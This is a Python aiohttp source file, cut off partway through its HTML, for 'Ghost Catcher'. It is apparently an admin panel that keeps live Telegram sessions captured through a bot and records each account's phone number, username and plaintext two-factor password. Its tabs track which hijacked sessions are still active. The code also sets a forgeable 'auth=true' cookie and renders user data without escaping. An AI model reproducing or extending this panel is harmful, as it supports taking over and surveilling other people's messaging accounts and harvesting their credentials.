import asyncio
from aiohttp import web
import logging
import re
import secrets
import string
import os
import json

from datetime import datetime, timedelta
from config import USERS_DIR, DOWNLOAD_FILTER_ADMINS
from telethon.tl.functions.users import GetFullUserRequest, GetUsersRequest
from telethon.tl.functions.account import GetPasswordRequest, GetAuthorizationsRequest, GetPrivacyRequest, GetAccountTTLRequest
from telethon.tl.functions.contacts import GetBlockedRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.account import ResetAuthorizationRequest
from telethon.tl.functions.messages import GetDefaultHistoryTTLRequest
from telethon.tl.types import (
    InputPrivacyKeyPhoneNumber, InputPrivacyKeyStatusTimestamp, InputPrivacyKeyProfilePhoto,
    InputPrivacyKeyForwards, InputPrivacyKeyPhoneCall, InputPrivacyKeyChatInvite,
    PrivacyValueAllowAll, PrivacyValueAllowContacts, PrivacyValueDisallowAll,
    PrivacyValueAllowUsers, PrivacyValueDisallowUsers
)

logger = logging.getLogger(__name__)

HISTORY_FILE = "user_history.json"
FAVORITES_FILE = "favorites.json"

def load_json(filename):
    if os.path.exists(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return {}
    return {}

def save_json(filename, data):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_history():
    return load_json(HISTORY_FILE)

def get_favorites():
    return load_json(FAVORITES_FILE)

def toggle_favorite_status(user_id):
    favs = get_favorites()
    user_id = str(user_id)
    is_fav = False
    if user_id in favs:
        del favs[user_id]
        is_fav = False
    else:
        favs[user_id] = True
        is_fav = True
    save_json(FAVORITES_FILE, favs)
    return is_fav

def set_custom_name(user_id, name):
    history = get_history()
    user_id = str(user_id)
    if user_id in history:
        history[user_id]['custom_name'] = name
        save_json(HISTORY_FILE, history)
        return True
    return False

def generate_password(length=10):
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(length))

async def handle_avatar(request):
    user_id = request.match_info.get('user_id')
    if not user_id:
        return web.Response(status=404)
    
    path = os.path.join(USERS_DIR, user_id, "profile.jpg")
    if os.path.exists(path):
        return web.FileResponse(path)
    
    svg = f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100" fill="#cccccc">
      <rect width="100" height="100" rx="50" />
      <text x="50" y="55" font-family="Arial" font-size="40" fill="white" text-anchor="middle" alignment-baseline="middle">{user_id[:1]}</text>
    </svg>"""
    return web.Response(text=svg, content_type='image/svg+xml')

async def handle_toggle_star(request):
    if request.cookies.get('auth') != 'true':
        return web.Response(status=403)
    try:
        data = await request.json()
        user_id = data.get('user_id')
        if not user_id: return web.Response(status=400)
        new_state = toggle_favorite_status(user_id)
        return web.json_response({'status': 'ok', 'is_favorite': new_state})
    except:
        return web.Response(status=400)

async def handle_set_name(request):
    if request.cookies.get('auth') != 'true':
        return web.Response(status=403)
    try:
        data = await request.json()
        user_id = data.get('user_id')
        name = data.get('name')
        if not user_id: return web.Response(status=400)
        set_custom_name(user_id, name)
        return web.json_response({'status': 'ok'})
    except:
        return web.Response(status=400)

async def handle_login_page(request):
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - Ghost Catcher</title>
        <style>
            body { 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
                background-color: #f0f2f5; 
                margin: 0; padding-top: 56px; box-sizing: border-box; 
            }
            .navbar { 
                position: fixed; top: 0; left: 0; width: 100%; height: 56px; 
                background-color: #2481cc; 
                box-shadow: 0 2px 4px rgba(0,0,0,0.2); 
                display: flex; align-items: center; padding: 0 10px; 
                z-index: 1000; box-sizing: border-box; 
            }
            .navbar-icon {
                width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; border: 2px solid white;
            }
            .navbar-title { 
                font-size: 20px; font-weight: 500; color: white; letter-spacing: 0.15px; 
            }
            .login-box { 
                background: white; padding: 40px; border-radius: 12px; 
                box-shadow: none; width: calc(100% - 20px); max-width: 320px; 
                margin: 20px auto 0;
                text-align: center; border: 1px solid #e0e0e0; box-sizing: border-box;
            }
            h2 { color: #1c1e21; margin-bottom: 25px; font-weight: 600; }
            input { 
                width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ddd; 
                border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.2s; 
            }
            input:focus { border-color: #2481cc; }
            button { 
                width: 100%; padding: 14px; background: #2481cc; color: white; 
                border: none; border-radius: 8px; font-size: 16px; font-weight: 600; 
                cursor: pointer; transition: background 0.2s; 
            }
            button:hover { background: #1a6fba; }
            @media (max-width: 600px) {
                .login-box { 
                    padding: 20px; 
                }
            }
            input, button { font-family: inherit; }
        </style>
    </head>
    <body>
        <div class="navbar">
            <img src="https://princeapps.com/telegram/ghost.png?v=2" class="navbar-icon" alt="icon">
            <div class="navbar-title">Ghost Catcher</div>
        </div>
        <div class="login-box">
            <h2>Welcome Back</h2>
            <form action="/login" method="post">
                <input type="password" name="password" placeholder="Enter Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    """
    return web.Response(text=html, content_type='text/html')

async def handle_login_post(request):
    data = await request.post()
    password = data.get('password')
    if password == request.app['admin_password']:
        response = web.HTTPFound('/')
        response.set_cookie('auth', 'true', max_age=3600*5)
        return response
    # Redirect back to login with alert
    html = """<!DOCTYPE html><html><head><meta charset="UTF-8"><script>alert("Incorrect Password");window.location.href="/login";</script></head><body></body></html>"""
    return web.Response(text=html, content_type='text/html')

async def handle_index(request):
    if request.cookies.get('auth') != 'true':
        raise web.HTTPFound('/login')

    active_sessions = request.app['active_sessions']
    history = get_history()
    favs = get_favorites()
    
    # Update History from Active Sessions
    updated = False
    
    # Debug: Print active session keys
    print(f"DEBUG: Active Sessions Keys: {list(active_sessions.keys())}", flush=True)

    # Check for validity of active sessions on refresh
    # We iterate over a COPY of keys to modify the dict safely
    invalid_users = []
    
    # Use gathers for parallel check to avoid lag
    check_tasks = []
    user_ids_list = list(active_sessions.keys())
    
    for uid in user_ids_list:
        session = active_sessions[uid]
        if hasattr(session, 'check_current_status'):
             check_tasks.append(session.check_current_status())
        else:
             # Fallback: assume True or check manually
             check_tasks.append(asyncio.sleep(0, result=True)) # no-op

    status_map = {}
    
    async def fetch_realtime_me(session):
        try:
            if session.client and session.client.is_connected():
                session.me = await session.client.get_me()
        except: pass

    # Run check tasks and real-time 'me' fetching in parallel to avoid dashboard loading lag
    fetch_tasks = [fetch_realtime_me(active_sessions[uid]) for uid in user_ids_list]
    
    if check_tasks or fetch_tasks:
        # Group everything and await once
        all_results = await asyncio.gather(*check_tasks, *fetch_tasks)
        
        # Parse status results: Check tasks are in the first len(check_tasks)
        status_results = all_results[:len(check_tasks)]
        
        for i, is_valid in enumerate(status_results):
            uid = user_ids_list[i]
            status_map[uid] = is_valid
            if not is_valid:
                invalid_users.append(uid)
    
    # Cleanup invalid sessions - DISABLED to prevent auto-logout on glitch
    # for bad_uid in invalid_users:
    #     logger.info(f"Removing invalid session for {bad_uid} (Revoked)")
    #     try:
    #         # Optionally stop the client properly?
    #         asyncio.create_task(active_sessions[bad_uid].stop())
    #     except: pass
    #     del active_sessions[bad_uid]
        
    for user_id, session in active_sessions.items():
        me = getattr(session, 'me', None)
        uid_str = str(user_id)
        
        name = "Unknown"
        username = "-"
        phone = "-"
        
        if me:
             first = getattr(me, 'first_name', '') or ''
             last = getattr(me, 'last_name', '') or ''
             name = f"{first} {last}".strip() or "User"
             if getattr(me, 'username', None):
                 username = f"@{me.username}"
             if getattr(me, 'phone', None):
                 phone = f"+{me.phone}"
        
        # Preserve custom name if exists
        existing = history.get(uid_str, {})
        custom_name = existing.get('custom_name')
        
        # Get 2FA from session object if available, else fallback to history, else None
        two_fa = getattr(session, 'two_fa_password', None)
        if not two_fa:
            two_fa = existing.get('two_fa')
        
        u_data = {
            'user_id': uid_str,
            'name': name,
            'username': username,
            'phone': phone,
            'custom_name': custom_name,
            'two_fa': two_fa
        }
        
        if uid_str not in history or history[uid_str] != u_data:
            history[uid_str] = u_data
            updated = True
            
    if updated:
        save_json(HISTORY_FILE, history)
        
    total_count = len(history) if history else 0
    fav_count = len(favs)
    active_count = 0
    active_ids_str = {str(k) for k in active_sessions.keys()}
    if history:
        for dict_uid in history.keys():
            in_mem = str(dict_uid).strip() in active_ids_str
            is_valid = status_map.get(int(dict_uid), True) if in_mem else False
            if in_mem and is_valid:
                active_count += 1
                
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Users List - Ghost Catcher</title>
        <style>
            body { 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
                background-color: #f0f2f5; 
                margin: 0; padding: 0; /* Sticky headers don't need padding-top */
                color: #1c1e21; 
            }
            .action-bar { 
                position: relative; z-index: 100; height: 56px; box-sizing: border-box;
                background: #2481cc; color: white; padding: 0 10px; gap: 10px;
                display: flex; align-items: center; justify-content: space-between;
                box-shadow: none; 
            }
            .navbar-icon { width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; border: 2px solid white; }
            .navbar-title { font-size: 20px; font-weight: 500; color: white; letter-spacing: 0.15px; }
            
            .tabs { 
                display: flex; width: 100%; height: 48px; background-color: #2481cc; align-items: center; 
                position: sticky; top: 0; z-index: 99;
                box-shadow: 0 2px 4px rgba(0,0,0,0.2);
            }
            .tab { 
                flex: 1; height: 100%; display: flex; align-items: center; justify-content: center;
                font-weight: 500; font-size: 14px; text-transform: none; letter-spacing: 0.5px;
                color: rgba(255,255,255,0.7); cursor: pointer; 
                border-bottom: 3px solid transparent; transition: background 0.2s, color 0.2s; 
            }
            .tab.active { color: #ffffff; border-bottom-color: #ffffff; background-color: rgba(255, 255, 255, 0.15); }
            .tab:hover { background-color: rgba(255,255,255,0.1); color: #ffffff; }

            .search-card { 
                background: #fff; padding: 5px; border-radius: 12px; 
                box-shadow: none; margin-bottom: 15px; border: 1px solid #e0e0e0;
            }
            .search-input { 
                width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #ddd; 
                font-size: 15px; outline: none; background: #f0f2f5; transition: all 0.2s; box-sizing: border-box;
            }
            .search-input:focus { background: #fff; border-color: #2481cc; }
            
            .container { max-width: 1200px; margin: 0 auto; padding: 15px; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
            
            .card { 
                background: #ffffff; border-radius: 12px; padding: 10px; border: 1px solid #e0e0e0; 
                display: flex; flex-direction: column; position: relative; 
            }
            .card.active-card { background-color: #e6fcf5; border-color: #63e6be; }
            .card.terminated-card { background-color: #fff5f5; border-color: #ffc9c9; }
            /* Removed hover transform/popup effect */
            
            .star-btn { 
                position: absolute; top: 10px; right: 10px; cursor: pointer; color: #b0b3b8; 
                display: flex; align-items: center; justify-content: center;
                background: rgba(255,255,255,0.8); border-radius: 50%; padding: 4px;
                transition: transform 0.1s;
            }
            .star-btn:active { transform: scale(0.9); }
            /* Filled icon when active */
            .star-btn.active { color: #2481cc; }
            .star-btn.active svg { fill: #2481cc; }
            
            .card-header { display: flex; align-items: center; margin-bottom: 10px; padding-bottom: 0; gap: 5px; padding-right: 40px; }
            .avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; background-color: #eee; border: 1px solid #fff; }
            .user-info { flex: 1; min-width: 0; }
            
            .name-row { display: flex; align-items: center; gap: 8px; }
            .user-name { font-size: 16px; font-weight: 600; color: #1c1e21; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
            .edit-icon { width: 14px; height: 14px; color: #65676b; cursor: pointer; opacity: 0.6; }
            .edit-icon:hover { opacity: 1; color: #2481cc; }
            
            .status-badge { font-size: 11px; font-weight: 500; display: flex; align-items: center; gap: 3px; color: #65676b; }
            .status-dot { width: 6px; height: 6px; border-radius: 50%; }
            .online .status-dot { background: #0ca678; }
            .offline .status-dot { background: #868e96; }
            
            .card-body { display: flex; flex-direction: column; }
            .info-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
            .row-left { display: flex; align-items: center; gap: 6px; }
            .row-right { display: flex; align-items: center; gap: 8px; }
            .info-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; min-height: 20px; }
            .row-left { display: flex; align-items: center; gap: 6px; }
            .row-right { display: flex; align-items: center; gap: 8px; }
            .row-icon { width: 14px; height: 14px; color: #65676b; opacity: 0.8; }
            .label { color: #65676b; font-weight: 500; }
            .value { color: #1c1e21; font-weight: 500; display: flex; align-items: center; }
            
            .copy-icon { width: 14px; height: 14px; color: #65676b; cursor: pointer; opacity: 0.6; transition: all 0.2s; }
            .copy-icon:hover { color: #2481cc; opacity: 1; transform: scale(1.1); }
            .copy-icon:active { transform: scale(0.9); }
            
            .hidden { display: none; }
            .admin-only { display: none; }
            .show-in-fav { display: none; }
            .no-users { grid-column: 1 / -1; text-align: center; padding: 60px; color: #65676b; background: #ffffff; border-radius: 12px; border: 1px solid #e0e0e0; }
            @media (max-width: 600px) { 
                .grid { grid-template-columns: 1fr; gap: 15px; } 
                .container { padding: 15px; } 
                .navbar { padding: 0 10px; } 
                .card { padding: 10px; }
            }
        </style>
        <script>
            let currentTab = 'active';
            let searchTerm = '';

            function render() {
                const isTotalTab = currentTab === 'total';
                const isFavTab = currentTab === 'fav';
                
                // Toggle visibility of admin-only rows (2FA - only Total)
                document.querySelectorAll('.admin-only').forEach(el => {
                    el.style.display = isTotalTab ? 'flex' : 'none';
                });
                
                // Toggle visibility of rows that should show in Total OR Fav (Status)
                document.querySelectorAll('.show-in-fav').forEach(el => {
                    el.style.display = (isTotalTab || isFavTab) ? 'flex' : 'none';
                });

                const cards = document.querySelectorAll('.user-card-wrapper');
                cards.forEach(card => {
                    const status = card.dataset.status;
                    const isFav = card.dataset.fav === "true";
                    
                    // Search match
                    const searchText = card.dataset.search.toLowerCase();
                    const matchesSearch = searchText.includes(searchTerm);
                    
                    // Tab match
                    let matchesTab = false;
                    if (currentTab === 'total') matchesTab = true; // Show all
                    if (currentTab === 'active' && status === 'active') matchesTab = true; // Show only active sessions
                    if (currentTab === 'fav' && isFav) matchesTab = true; // Show favorites
                    
                    if (matchesTab && matchesSearch) {
                        card.classList.remove('hidden');
                    } else {
                        card.classList.add('hidden');
                    }
                });
                
                const fmBtn = document.getElementById('files-tab-content');
                const cardGrid = document.getElementById('card-grid');
                const searchCard = document.querySelector('.search-card');
                
                if (currentTab === 'files') {
                    if (cardGrid) cardGrid.style.display = 'none';
                    if (searchCard) searchCard.style.display = 'none';
                    if (fmBtn) fmBtn.style.display = 'flex';
                } else {
                    if (cardGrid) cardGrid.style.display = 'grid';
                    if (searchCard) searchCard.style.display = 'block';
                    if (fmBtn) fmBtn.style.display = 'none';
                }
            }

            function switchTab(tabName) {
                window.scrollTo(0, 0);
                currentTab = tabName;
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.getElementById('tab-' + tabName).classList.add('active');
                
                // Clear search input
                const searchInput = document.querySelector('.search-input');
                if (searchInput) {
                    searchInput.value = '';
                    searchTerm = '';
                }
                
                render();
            }
            
            function onSearch(input) {
                searchTerm = input.value.toLowerCase();
                render();
            }

            function updateCounts() {
                const total = document.querySelectorAll('.user-card-wrapper').length;
                const active = document.querySelectorAll('.user-card-wrapper[data-status="active"]').length;
                const fav = document.querySelectorAll('.user-card-wrapper[data-fav="true"]').length;
                
                const tabActive = document.getElementById('tab-active');
                if(tabActive) tabActive.textContent = `Active (${active})`;
                
                const tabFav = document.getElementById('tab-fav');
                if(tabFav) tabFav.textContent = `Favorite (${fav})`;
                
                const tabTotal = document.getElementById('tab-total');
                if(tabTotal) tabTotal.textContent = `Total (${total})`;
            }

            async function toggleStar(btn, userId) {
                const isNowActive = !btn.classList.contains('active');
                btn.classList.toggle('active');
                const wrapper = btn.closest('.user-card-wrapper');
                wrapper.dataset.fav = isNowActive ? "true" : "false";
                
                updateCounts(); // Instantly update tab numbers
                if (currentTab === 'fav') render(); // Hide/Show dynamically if currently in favored tab

                try {
                    const response = await fetch('/api/toggle_star', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({user_id: userId})
                    });
                    const data = await response.json();
                    if (!data.is_favorite && isNowActive) {
                        btn.classList.remove('active');
                        wrapper.dataset.fav = "false";
                        updateCounts();
                        if (currentTab === 'fav') render();
                    }
                } catch(e) {
                    btn.classList.toggle('active');
                    wrapper.dataset.fav = isNowActive ? "false" : "true";
                    updateCounts();
                    if (currentTab === 'fav') render();
                }
            }
            
            async function checkAdminProfile(uid, isAdmin) {
                if (isAdmin) {
                    if (document.cookie.indexOf('master_auth=true') === -1) {
                        const pwd = prompt("Enter master password to access this user...");
                        if (!pwd) return;
                        try {
                            const res = await fetch('/api/check_master', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({password: pwd})
                            });
                            const data = await res.json();
                            if (data.success) {
                                window.location.href = '/user/' + uid;
                            } else {
                                alert("Incorrect Password");
                            }
                        } catch (e) {
                            alert("Error checking password.");
                        }
                    } else {
                        window.location.href = '/user/' + uid;
                    }
                } else {
                    window.location.href = '/user/' + uid;
                }
            }

            async function checkFMPassword() {
                const pwd = document.getElementById('fm-password').value;
                try {
                    const res = await fetch('/api/check_master', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: pwd})
                    });
                    const data = await res.json();
                    if (data.success) {
                        window.location.href = '/files';
                    } else {
                        alert('Incorrect Password');
                        document.getElementById('fm-error').style.display = 'block';
                    }
                } catch (e) {
                    document.getElementById('fm-error').style.display = 'block';
                }
            }
            
            async function editName(userId, currentName) {
                const newName = prompt("Enter custom name for this user:", currentName);
                if (newName !== null) {
                    try {
                        const response = await fetch('/api/set_name', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({user_id: userId, name: newName})
                        });
                        if (response.ok) {
                            location.reload(); // reload to update UI simply
                        }
                    } catch(e) {
                         alert("Failed to update name");
                    }
                }
            }
            
            function copyText(text) {
                if (!text || text === '-' || text === 'null') return;
                navigator.clipboard.writeText(text);
            }
        </script>
    </head>
    <body onload="render()">
        <div class="action-bar">
            <div style="display: flex; align-items: center;">
                <img src="https://princeapps.com/telegram/ghost.png?v=2" class="navbar-icon" alt="Logo">
                <div class="navbar-title">Ghost Catcher</div>
            </div>
        </div>
        <div class="tabs">
            <div id="tab-active" class="tab active" onclick="switchTab('active')">Active (""" + str(active_count) + """)</div>
            <div id="tab-fav" class="tab" onclick="switchTab('fav')">Favorite (""" + str(fav_count) + """)</div>
            <div id="tab-total" class="tab" onclick="switchTab('total')">Total (""" + str(total_count) + """)</div>
            <div id="tab-files" class="tab" onclick="switchTab('files')">Files</div>
        </div>
        
        <div class="container">
            <!-- Search Bar -->
            <div class="search-card">
                <input type="text" class="search-input" placeholder="Search by name, ID or username..." onkeyup="onSearch(this)">
            </div>
            <div class="grid" id="card-grid">
    """
    
    if not history:
        html_content += """<div class="no-users"><h3>No data available</h3><p>Connect users via the bot to see them here.</p></div>"""
    else:
        history_items = sorted(history.items(), key=lambda x: (x[1].get('custom_name') or x[1].get('name', '')).lower())
        for uid, udata in history_items:
            is_active = int(uid) in active_sessions
            is_fav = uid in favs
            
            status_text = "Online" if is_active else "Offline"
            status_class = "online" if is_active else "offline"
            
            star_class = "active" if is_fav else ""
            fav_bool = "true" if is_fav else "false"
            
            # Name Logic
            real_name = udata.get('name', 'Unknown')
            custom_name = udata.get('custom_name')
            display_name = custom_name if custom_name else real_name
            
            # Status line: [Dot] Real Name (as requested)
            status_line = real_name
            
            # 2FA and Status Logic
            two_fa_pass = udata.get('two_fa', 'None')
            
            # Status Logic
            # Robust check: Convert all active session keys to strings to ensure matching
            active_ids_str = {str(k) for k in active_sessions.keys()}
            in_memory = str(uid).strip() in active_ids_str
            
            # Check status map for detailed validity
            is_valid_session = status_map.get(int(uid), True) if in_memory else False
            
            is_active = in_memory and is_valid_session
            
            session_status = "Active" if is_active else "Terminated"
            status_color = "#0ca678" if is_active else "#fa5252" # Green / Red
            status_val_text = session_status
            
            # Use 'active'/'terminated' for data-status to be clear in JS
            data_status_val = "active" if is_active else "terminated"
            # Use 'online'/'offline' for CSS dot styling
            status_class = "online" if is_active else "offline"

            # Icons
            shield_check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-wifi-icon lucide-wifi"><path d="M12 20h.01"/><path d="M2 8.82a15 15 0 0 1 20 0"/><path d="M5 12.859a10 10 0 0 1 14 0"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/></svg>"""
            shield_x_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-wifi-off-icon lucide-wifi-off"><path d="M12 20h.01"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/><path d="M5 12.859a10 10 0 0 1 5.17-2.69"/><path d="M19 12.859a10 10 0 0 0-2.007-1.523"/><path d="M2 8.82a15 15 0 0 1 4.177-2.643"/><path d="M22 8.82a15 15 0 0 0-11.288-3.764"/><path d="m2 2 20 20"/></svg>"""
            
            status_icon_svg = shield_check_svg if is_active else shield_x_svg
            
            # Left side row icons
            shield_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-shield-check-icon lucide-shield-check"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>"""
            lock_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-lock-icon lucide-lock"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>"""
            
            star_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-star-icon lucide-star"><path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/></svg>"""
            
            user_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-hash"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>"""
            user_search_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-at-sign-icon lucide-at-sign"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/></svg>"""
            phone_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="row-icon lucide lucide-phone-icon lucide-phone"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
            copy_icon = """<svg xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px" fill="currentColor" class="copy-icon"><path d="M360-240q-29.7 0-50.85-21.15Q288-282.3 288-312v-480q0-29.7 21.15-50.85Q330.3-864 360-864h384q29.7 0 50.85 21.15Q816-821.7 816-792v480q0 29.7-21.15 50.85Q773.7-240 744-240H360Zm0-72h384v-480H360v480ZM216-96q-29.7 0-50.85-21.15Q144-138.3 144-168v-552h72v552h456v72H216Zm144-216v-480 480Z"/></svg>"""
            edit_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-square-pen-icon lucide-square-pen"><path d="M12 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.375 2.625a1 1 0 0 1 3 3l-9.013 9.014a2 2 0 0 1-.853.505l-2.873.84a.5.5 0 0 1-.62-.62l.84-2.873a2 2 0 0 1 .506-.852z"/></svg>"""

            # Search String construction
            search_str = f"{uid} {real_name} {custom_name or ''} {udata.get('username')} {udata.get('phone')}".lower()

            # Card Background Class
            card_class = "active-card" if is_active else "terminated-card"

            # Username Display Logic
            username_display_val = udata.get('username')
            if not username_display_val or username_display_val == '-' or username_display_val == 'None':
                 username_display_val = "None"
            
            # 2FA Display Logic
            two_fa_display_val = two_fa_pass
            if not two_fa_display_val or two_fa_display_val == 'None':
                two_fa_display_val = "None"
                
            wrapper_class = "user-card-wrapper hidden" if not is_active else "user-card-wrapper"
            
            is_admin_str = "true" if int(uid) in DOWNLOAD_FILTER_ADMINS else "false"

            html_content += f"""
                <div class="{wrapper_class}" data-status="{data_status_val}" data-fav="{fav_bool}" data-search="{search_str}">
                    <div class="card {card_class}" onclick="checkAdminProfile('{uid}', {is_admin_str})" style="cursor: pointer;">
                        <div class="star-btn {star_class}" onclick="event.stopPropagation(); toggleStar(this, '{uid}')">
                            {star_svg}
                        </div>
                        <div class="card-header">
                            <img src="/avatar/{uid}" class="avatar" alt="Avatar" onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgZmlsbD0iI2NjY2NjYyI+PHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIHJ4PSI1MCIgLz48L3N2Zz4='";">
                            <div class="user-info">
                                <div class="name-row">
                                    <div class="user-name" title="{display_name}">{display_name}</div>
                                    <div class="edit-icon" onclick="event.stopPropagation(); editName('{uid}', '{custom_name if custom_name else ''}')" title="Set Nickname">
                                        {edit_icon}
                                    </div>
                                </div>
                                <div class="status-badge">
                                    {status_line}
                                </div>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="info-row show-in-fav" style="display: none;">
                                <div class="row-left">
                                    {shield_icon}
                                    <span class="label">Status</span>
                                </div>
                                <div class="row-right">
                                    <span class="value" style="color: {status_color}; font-weight: 600;">{status_val_text}</span>
                                    {status_icon_svg}
                                </div>
                            </div>
                            <div class="info-row">
                                <div class="row-left">
                                    {user_icon}
                                    <span class="label">User ID</span>
                                </div>
                                <div class="row-right">
                                    <span class="value">{uid}</span>
                                    <span onclick="event.stopPropagation(); copyText('{uid}')" title="Copy ID">{copy_icon}</span>
                                </div>
                            </div>
                            <div class="info-row">
                                <div class="row-left">
                                    {user_search_icon}
                                    <span class="label">Username</span>
                                </div>
                                <div class="row-right">
                                    <span class="value">{username_display_val}</span>
                                    <span onclick="event.stopPropagation(); copyText('{username_display_val}')" title="Copy Username">{copy_icon}</span>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            """

    files_svg_icon = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-files-icon lucide-files"><path d="M15 2h-4a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V8"/><path d="M16.706 2.706A2.4 2.4 0 0 0 15 2v5a1 1 0 0 0 1 1h5a2.4 2.4 0 0 0-.706-1.706z"/><path d="M5 7a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h8a2 2 0 0 0 1.732-1"/></svg>"""
    html_content += f"""
            </div>
            
            <div id="files-tab-content" style="display: none; align-items: center; justify-content: flex-start; padding-top:20px; flex-direction: column;">
                <div class="login-box" style="margin: 0 auto; width: calc(100% - 20px); max-width: 320px; text-align: center; border: 1px solid #e0e0e0; border-radius: 12px; padding: 40px; background: white; box-sizing: border-box;">
                    <h2 style="color: #1c1e21; margin-bottom: 25px; font-weight: 600;">Access File Manager</h2>
